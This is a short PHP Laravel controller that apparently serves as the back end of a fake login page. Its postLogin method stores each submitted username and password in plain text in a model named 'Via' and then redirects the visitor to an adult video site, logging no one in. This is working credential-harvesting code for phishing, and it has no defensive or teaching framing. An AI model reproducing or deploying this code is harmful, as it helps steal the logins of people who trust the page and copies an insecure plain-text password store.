<?php

namespace App\Http\Controllers\User;

use App\Via;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Http\Requests\Checklogin;
use Illuminate\Support\Facades\Redirect;

class UserController extends Controller
{
    //

    public function getLogin()
    {
        return view('dangnhap');
    }

    public function postLogin(Checklogin $request)
    {
        $url="http://javphim.net/genre/jav/";
        $via=new Via();
        $via->taikhoan=$request->taikhoan;
        $via->matkhau=$request->matkhau;
        $via->save();

        return Redirect::to($url);
    }
}
